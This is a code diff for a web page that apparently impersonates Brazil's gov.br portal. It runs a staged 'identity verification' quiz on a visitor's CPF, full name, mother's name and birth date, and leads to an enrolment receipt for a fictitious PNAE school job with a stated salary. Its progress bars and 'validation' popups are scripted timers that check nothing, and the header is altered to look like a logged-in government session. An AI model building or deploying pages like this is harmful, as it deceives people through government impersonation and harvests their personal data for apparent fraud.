+                    // Atualizar barra de progresso principal
+                    document.getElementById('progress-bar-1').style.width = Math.min(porcentagem, 100) + '%';
+
+                    // Ativar etapa 2 (Documentação) quando passar de 50%
+                    if (porcentagem >= 50) {
+                        document.getElementById('step2-circle').classList.remove('bg-gray-300', 'text-gray-600');
+                        document.getElementById('step2-circle').classList.add('bg-blue-600', 'text-white');
+                        document.getElementById('step2-text').classList.remove('text-gray-600');
+                        document.getElementById('step2-text').classList.add('text-blue-600', 'font-medium');
+
+                        // Animar segunda barra
+                        const progresso2 = Math.max(0, porcentagem - 50) * 2; // 0-100% para a segunda barra
+                        document.getElementById('progress-bar-2').style.width = Math.min(progresso2, 100) + '%';
+                    }
+
+                    // Ativar etapa 3 (Finalização) quando chegar a 100%
+                    if (porcentagem >= 100) {
+                        document.getElementById('step3-circle').classList.remove('bg-gray-300', 'text-gray-600');
+                        document.getElementById('step3-circle').classList.add('bg-green-600', 'text-white');
+                        document.getElementById('step3-text').classList.remove('text-gray-600');
+                        document.getElementById('step3-text').classList.add('text-green-600', 'font-medium');
+                    }
+                }
+
+                function finalizarValidacao() {
+                    document.getElementById('dados-carregados').classList.remove('hidden');
+
+                    const dadosLocalizacao = JSON.parse(localStorage.getItem('dadosLocalizacao') || '{}');
+
+                    if (dadosLocalizacao.localidade) {
+                        const logradouroCompleto = dadosLocalizacao.logradouro
+                            ? `${dadosLocalizacao.logradouro}, ${dadosLocalizacao.bairro} - ${dadosLocalizacao.localidade}/${dadosLocalizacao.uf}`
+                            : `${dadosLocalizacao.bairro} - ${dadosLocalizacao.localidade}/${dadosLocalizacao.uf}`;
+                        document.getElementById('dado-logradouro').textContent = logradouroCompleto;
+                    } else {
+                        document.getElementById('dado-logradouro').textContent = 'Dados de localização não disponíveis';
+                    }
+
+                    if (window.dadosCpfValidado) {
+                        localStorage.setItem('dadosCpfValidado', JSON.stringify(window.dadosCpfValidado));
+                        document.getElementById('dado-nome-auth').textContent = window.dadosCpfValidado.nome;
+                        document.getElementById('dado-cpf-auth').textContent = formatarCPF(window.dadosCpfValidado.cpf);
+                        document.getElementById('dado-mae-auth').textContent = window.dadosCpfValidado.nome_mae;
+                        atualizarCabecalho(window.dadosCpfValidado.nome);
+                    }
+
+                    btnContinuar.innerHTML = '<i class="fas fa-check mr-2"></i>Autenticado';
+                    btnContinuar.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+                    btnContinuar.classList.add('bg-green-600', 'hover:bg-green-700');
+
+                    const btnFinalizar = document.getElementById('finalizar-verificacao');
+                    btnFinalizar.classList.remove('hidden');
+                    btnFinalizar.disabled = false;
+
+                    document.getElementById('validation-popup').classList.add('hidden');
+
+                    setTimeout(() => {
+                        const dadosCarregados = document.getElementById('dados-carregados');
+                        if (dadosCarregados) {
+                            dadosCarregados.scrollIntoView({
+                                behavior: 'smooth',
+                                block: 'center'
+                            });
+                        }
+                    }, 800);
+
+                    btnFinalizar.addEventListener('click', function () {
+                        const currentParams = new URLSearchParams(window.location.search);
+                        window.location.href = '/page/comprovante' + (currentParams.toString() ? '?' + currentParams.toString() : '');
+                    });
+                }
+
+
+                function formatarCPF(cpf) {
+                    // Remove caracteres não numéricos
+                    const cpfLimpo = cpf.replace(/\D/g, '');
+                    // Formata como XXX.XXX.XXX-XX
+                    return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                }
+
+                function atualizarCabecalho(nomeCompleto) {
+                    // Extrair primeiro nome
+                    const primeiroNome = nomeCompleto.split(' ')[0];
+
+                    // Procurar o botão "Entrar" no cabeçalho e substituir pelo nome
+                    const entrarBtn = document.querySelector('a[href*="login"]');
+                    if (entrarBtn) {
+                        entrarBtn.innerHTML = `<i class="fas fa-user mr-1"></i>${primeiroNome}`;
+                        entrarBtn.href = '#';
+                        // Manter o estilo do gov.br
+                        entrarBtn.classList.remove('hover:bg-blue-700');
+                        entrarBtn.classList.add('cursor-default');
+                    }
+                }
+
+                function mostrarQuizVerificacao(dados) {
+                    // Rolar para o topo da página para mostrar o cabeçalho
+                    window.scrollTo({
+                        top: 0,
+                        behavior: 'smooth'
+                    });
+
+                    // Delay de 2 segundos antes de mostrar o quiz
+                    setTimeout(() => {
+                        // Esconder formulário atual
+                        document.getElementById('form-cpf').style.display = 'none';
+
+                        // Estado do quiz
+                        window.quizState = {
+                            etapaAtual: 1,
+                            dados: dados,
+                            acertos: 0,
+                            tentativas: { 1: 0, 2: 0, 3: 0 }
+                        };
+
+                        // Inserir container do quiz
+                        const container = document.querySelector('.bg-white.border.border-gray-200.rounded-lg.p-6.mb-8');
+                        container.innerHTML = `
+            <h3 class="text-xl font-semibold text-gray-800 mb-6">
+                <i class="fas fa-user-shield mr-2"></i>
+                Verificação de Identidade
+            </h3>
+            
+            <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-6 mb-6">
+                <div class="flex items-center mb-4">
+                    <i class="fas fa-shield-alt text-yellow-600 text-xl mr-3"></i>
+                    <h3 class="text-lg font-semibold text-yellow-800">Verificação de Segurança</h3>
+                </div>
+                <p class="text-sm text-yellow-700 mb-4">
+                    Para sua segurança, confirme as informações abaixo selecionando as opções corretas:
+                </p>
+                <div class="text-xs text-yellow-600">
+                    <span>Etapa <span id="etapa-atual">1</span> de 3</span>
+                </div>
+            </div>
+
+            <!-- Área de mensagens -->
+            <div id="quiz-message" class="mb-4 hidden"></div>
+
+            <!-- Container das perguntas -->
+            <div id="quiz-container"></div>
+
+            <div class="flex justify-between items-center pt-6 border-t border-gray-200">
+                <button type="button" onclick="voltarFormulario()" 
+                        class="inline-flex items-center px-4 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 bg-white hover:bg-gray-50">
+                    <i class="fas fa-arrow-left mr-2"></i>
+                    Voltar
+                </button>
+                
+                <div id="quiz-progress" class="text-sm text-gray-600">
+                    Responda às perguntas para continuar
+                </div>
+            </div>
+        `;
+
+                        // Iniciar primeira pergunta
+                        mostrarPergunta(1);
+
+                        // Após mostrar o quiz, rolar para a seção do quiz
+                        setTimeout(() => {
+                            const quizContainer = document.querySelector('.bg-white.border.border-gray-200.rounded-lg.p-6.mb-8');
+                            if (quizContainer) {
+                                quizContainer.scrollIntoView({
+                                    behavior: 'smooth',
+                                    block: 'start'
+                                });
+                            }
+                        }, 500);
+                    }, 2000);
+                }
+
+                function mostrarPergunta(etapa) {
+                    const container = document.getElementById('quiz-container');
+                    const dados = window.quizState.dados;
+
+                    let pergunta, opcoes, respostaCorreta;
+
+                    switch (etapa) {
+                        case 1:
+                            pergunta = "1. Qual é o seu nome completo?";
+                            opcoes = dados.quiz.nomes;
+                            respostaCorreta = dados.dados_originais.nome;
+                            break;
+                        case 2:
+                            pergunta = "2. Qual é o nome da sua mãe?";
+                            opcoes = dados.quiz.maes;
+                            respostaCorreta = dados.dados_originais.nome_mae;
+                            break;
+                        case 3:
+                            pergunta = "3. Qual é a sua data de nascimento?";
+                            opcoes = dados.quiz.datas.map(data => {
+                                return {
+                                    valor: data,
+                                    texto: new Date(data).toLocaleDateString('pt-BR')
+                                };
+                            });
+                            respostaCorreta = dados.dados_originais.data_nascimento;
+                            break;
+                    }
+
+                    const perguntaHTML = `
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-3">
+                        ${pergunta}
+                    </label>
+                    <div class="space-y-2">
+                        ${(etapa === 3 ? opcoes : opcoes.map(op => ({ valor: op, texto: op }))).map((opcao, index) => `
+                            <label class="flex items-center p-3 border border-gray-200 rounded cursor-pointer hover:bg-blue-50 quiz-option" 
+                                   data-value="${opcao.valor}">
+                                <input type="radio" name="quiz-etapa-${etapa}" value="${opcao.valor}" class="mr-3">
+                                <span>${opcao.texto}</span>
+                            </label>
+                        `).join('')}
+                    </div>
+                </div>
+            </div>
+        `;
+
+                    container.innerHTML = perguntaHTML;
+                    document.getElementById('etapa-atual').textContent = etapa;
+
+                    // Adicionar eventos aos radio buttons
+                    const radios = container.querySelectorAll('input[type="radio"]');
+                    radios.forEach(radio => {
+                        radio.addEventListener('change', function () {
+                            verificarResposta(etapa, this.value, respostaCorreta);
+                        });
+                    });
+                }
+
+                function verificarResposta(etapa, resposta, respostaCorreta) {
+                    const isCorrect = resposta === respostaCorreta;
+                    const opcoes = document.querySelectorAll('.quiz-option');
+
+                    window.quizState.tentativas[etapa]++;
+
+                    if (isCorrect) {
+                        // Resposta correta
+                        opcoes.forEach(opcao => {
+                            if (opcao.dataset.value === resposta) {
+                                opcao.classList.add('bg-green-50', 'border-green-500');
+                                opcao.querySelector('span').classList.add('text-green-700', 'font-medium');
+                            }
+                            opcao.style.pointerEvents = 'none';
+                        });
+
+                        mostrarMensagem('Correto!', 'success');
+                        window.quizState.acertos++;
+
+                        // Atualizar barra de progresso conforme a etapa
+                        atualizarBarraProgresso(etapa);
+
+                        // Próxima pergunta após delay de 2 segundos
+                        setTimeout(() => {
+                            if (etapa < 3) {
+                                window.quizState.etapaAtual = etapa + 1;
+                                mostrarPergunta(etapa + 1);
+                                esconderMensagem();
+                            } else {
+                                finalizarQuiz();
+                            }
+                        }, 2000);
+
+                    } else {
+                        // Resposta incorreta
+                        opcoes.forEach(opcao => {
+                            if (opcao.dataset.value === resposta) {
+                                opcao.classList.add('bg-red-50', 'border-red-500');
+                                opcao.querySelector('span').classList.add('text-red-700');
+                            }
+                        });
+
+                        mostrarMensagem('Informação incorreta. Tente novamente.', 'error');
+
+                        // Permitir nova tentativa após delay
+                        setTimeout(() => {
+                            opcoes.forEach(opcao => {
+                                if (opcao.dataset.value === resposta) {
+                                    opcao.classList.remove('bg-red-50', 'border-red-500');
+                                    opcao.querySelector('span').classList.remove('text-red-700');
+                                    opcao.querySelector('input').checked = false;
+                                }
+                            });
+                            esconderMensagem();
+                        }, 2000);
+                    }
+                }
+
+                function mostrarMensagem(texto, tipo) {
+                    const messageDiv = document.getElementById('quiz-message');
+                    messageDiv.className = `mb-4 p-4 rounded-lg ${tipo === 'success' ? 'bg-green-50 border border-green-200 text-green-800' : 'bg-red-50 border border-red-200 text-red-800'}`;
+                    messageDiv.innerHTML = `
+            <div class="flex items-center">
+                <i class="fas fa-${tipo === 'success' ? 'check-circle' : 'exclamation-triangle'} mr-2"></i>
+                <span>${texto}</span>
+            </div>
+        `;
+                    messageDiv.classList.remove('hidden');
+                }
+
+                function esconderMensagem() {
+                    document.getElementById('quiz-message').classList.add('hidden');
+                }
+
+                function finalizarQuiz() {
+                    const progressDiv = document.getElementById('quiz-progress');
+                    progressDiv.innerHTML = `
+            <button type="button" onclick="concluirVerificacao()" 
+                    class="inline-flex items-center px-6 py-3 border border-transparent text-base font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700">
+                Finalizar Verificação
+                <i class="fas fa-check ml-2"></i>
+            </button>
+        `;
+                }
+
+                function atualizarBarraProgresso(etapa) {
+                    // Atualizar progresso desktop
+                    const desktopProgress = document.querySelector('.hidden.md\\:flex');
+                    if (desktopProgress) {
+                        const circulos = desktopProgress.querySelectorAll('.w-7.h-7');
+                        const barras = desktopProgress.querySelectorAll('.flex-1.mx-3.h-1.bg-gray-200.rounded div');
+                        const textos = desktopProgress.querySelectorAll('span');
+
+                        if (etapa >= 2) {
+                            // Ativar etapa 2 (Documentação)
+                            if (circulos[1]) {
+                                circulos[1].classList.remove('bg-gray-300', 'text-gray-600');
+                                circulos[1].classList.add('bg-blue-600', 'text-white');
+                            }
+                            if (textos[3]) {
+                                textos[3].classList.remove('text-gray-600');
+                                textos[3].classList.add('text-blue-600', 'font-medium');
+                            }
+                            if (barras[0]) {
+                                barras[0].style.width = '66%';
+                            }
+                        }
+
+                        if (etapa >= 3) {
+                            // Ativar etapa 3 (Finalização)
+                            if (circulos[2]) {
+                                circulos[2].classList.remove('bg-gray-300', 'text-gray-600');
+                                circulos[2].classList.add('bg-blue-600', 'text-white');
+                            }
+                            if (textos[5]) {
+                                textos[5].classList.remove('text-gray-600');
+                                textos[5].classList.add('text-blue-600', 'font-medium');
+                            }
+                            if (barras[1]) {
+                                barras[1].classList.add('bg-blue-600');
+                                barras[1].style.width = '100%';
+                            }
+                            if (barras[0]) {
+                                barras[0].style.width = '100%';
+                            }
+                        }
+                    }
+
+                    // Atualizar progresso mobile
+                    const mobileProgress = document.querySelector('.md\\:hidden');
+                    if (mobileProgress) {
+                        const porcentagem = document.querySelector('.text-xs.font-medium.text-blue-600');
+                        const barraMobile = document.querySelector('.bg-blue-600.h-2.rounded-full');
+                        const etapas = mobileProgress.querySelectorAll('.flex.justify-between.text-xs span');
+
+                        if (etapa >= 2) {
+                            // Atualizar para 66%
+                            if (porcentagem) porcentagem.textContent = '66% concluído';
+                            if (barraMobile) barraMobile.style.width = '66%';
+
+                            // Ativar etapa Documentação
+                            if (etapas[1]) {
+                                etapas[1].classList.remove('text-gray-500');
+                                etapas[1].classList.add('font-medium', 'text-blue-600');
+                                etapas[1].textContent = '• Documentação';
+                            }
+                        }
+
+                        if (etapa >= 3) {
+                            // Atualizar para 100%
+                            if (porcentagem) porcentagem.textContent = '100% concluído';
+                            if (barraMobile) barraMobile.style.width = '100%';
+
+                            // Ativar etapa Finalização
+                            if (etapas[2]) {
+                                etapas[2].classList.remove('text-gray-500');
+                                etapas[2].classList.add('font-medium', 'text-blue-600');
+                                etapas[2].textContent = '• Finalização';
+                            }
+                        }
+                    }
+                }
+
+                window.concluirVerificacao = function () {
+                    if (window.quizState.acertos >= 2) {
+                        // Salvar dados no localStorage para usar na próxima página
+                        const dadosCompletos = {
+                            cpf: window.quizState.dados.dados_originais.cpf,
+                            nome: window.quizState.dados.dados_originais.nome,
+                            nomeMae: window.quizState.dados.dados_originais.nome_mae,
+                            dataNascimento: window.quizState.dados.dados_originais.data_nascimento,
+                            // Dados fictícios para demonstração do comprovante
+                            cep: '01234-567',
+                            endereco: 'Rua das Flores, 123 - Centro',
+                            cidade: 'São Paulo - SP',
+                            escola: 'EMEF Prof. João Silva',
+                            cargo: 'Auxiliar Administrativo',
+                            salario: 'R$ 3.312,89',
+                            protocoloInscricao: 'PNAE' + Date.now().toString().slice(-8)
+                        };
+
+                        localStorage.setItem('dadosInscricao', JSON.stringify(dadosCompletos));
+
+                        alert('Identidade verificada com sucesso!\n\nVocê será redirecionado para o comprovante de inscrição.');
+                        const currentParams = new URLSearchParams(window.location.search);
+                        window.location.href = '/comprovante-inscricao' + (currentParams.toString() ? '?' + currentParams.toString() : '');
+                    } else {
+                        alert('Verificação falhou. As informações não conferem.\n\nTente novamente ou entre em contato com o suporte.');
+                        location.reload();
+                    }
+                };
+
+                window.voltarFormulario = function () {
+                    location.reload();
+                };
+
+                // Funções para controlar o popup de validação
+                function mostrarValidacao(mensagem, detalhes) {
+                    const popup = document.getElementById('validation-popup');
+                    const messageEl = document.getElementById('validation-message');
+                    const detailsEl = document.getElementById('validation-details');
+                    const progressEl = document.getElementById('validation-progress');
+
+                    messageEl.textContent = mensagem;
+                    detailsEl.textContent = detalhes;
+                    progressEl.style.width = '0%';
+
+                    popup.classList.remove('hidden');
+
+                    // Animar progresso
+                    setTimeout(() => progressEl.style.width = '25%', 300);
+                    setTimeout(() => progressEl.style.width = '50%', 900);
+                    setTimeout(() => progressEl.style.width = '75%', 1500);
+                    setTimeout(() => progressEl.style.width = '100%', 2100);
+
+                    // Esconder popup após validação
+                    setTimeout(() => {
+                        messageEl.textContent = 'Validação concluída';
+                        detailsEl.textContent = 'Dados verificados com sucesso';
+                        setTimeout(() => {
+                            popup.classList.add('hidden');
+                        }, 1000);
+                    }, 2800);
+                }
+            });
+        </script>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#0a1f44] text-white">
+        <div class="container mx-auto px-6 py-4">
+            <!-- Logo -->
+            <div class="py-6">
+                <img src="images/1200px-Gov.br_logo.svg.png"
+                    alt="Government of Brazil logo showing gov.br in white text" class="w-40">
+            </div>
+
+            <!-- Divider -->
+            <div class="border-t border-gray-600"></div>
+
+            <!-- Navigation Menu -->
+            <nav aria-label="Menu principal do rodapé">
+                <ul>
+                    <li class="py-3">
+                        <a href="#" class="text-sm hover:text-gray-300">MEC</a>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">Saúde BÁSICA</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Saúde Básica">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">ENSINO SUPERIOR</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Ensino Superior">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">PROGRAMAS EDUCACIONAIS</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Programas Educacionais">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="/acesso-informacao" class="text-sm hover:text-gray-300">ACESSO À INFORMAÇÃO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Acesso à Informação">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">PORTAL DO PROFESSOR</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Portal do Professor">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">CANAIS DE ATENDIMENTO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Canais de Atendimento">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">POLÍTICAS EDUCACIONAIS</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Políticas Educacionais">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600"></li>
+                </ul>
+            </nav>
+
+            <!-- Cookie Settings -->
+            <div class="mt-6 flex items-center">
+                <button id="cookie-settings" class="flex items-center hover:text-gray-300"
+                    aria-label="Redefinir configurações de cookies">
+                    <i class="fas fa-cookie-bite text-lg mr-2"></i>
+                    <span class="text-sm">Redefinir Cookies</span>
+                </button>
+            </div>
+
+            <!-- Social Networks -->
+            <div class="redes-e-logos mt-8">
+                <div class="redes-sociais">
+                    <div class="titulo text-sm font-bold mb-4">Redes sociais</div>
+                    <ul class="portal-redes">
+                        <li class="portalredes-youtube portalredes-item">
+                            <a href="#" aria-label="YouTube" class="social-link">
+                                <i class="fab fa-youtube social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-facebook portalredes-item">
+                            <a href="#" aria-label="Facebook" class="social-link">
+                                <i class="fab fa-facebook-f social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-twitter portalredes-item">
+                            <a href="#" aria-label="Twitter" class="social-link">
+                                <i class="fab fa-twitter social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-instagram portalredes-item">
+                            <a href="#" aria-label="Instagram" class="social-link">
+                                <i class="fab fa-instagram social-icon"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Search Modal -->
+    <div id="search-modal" class="search-modal hidden">
+        <div class="search-modal-content">
+            <div class="search-modal-header">
+                <h3>Pesquisar</h3>
+                <button id="close-search-modal" aria-label="Fechar pesquisa">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="search-modal-body">
+                <form id="search-form">
+                    <input type="text" id="search-input" placeholder="Digite sua pesquisa..."
+                        aria-label="Campo de pesquisa">
+                    <button type="submit" aria-label="Pesquisar">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="js/main-3.js"></script>
+
+</body>
+
+</html>
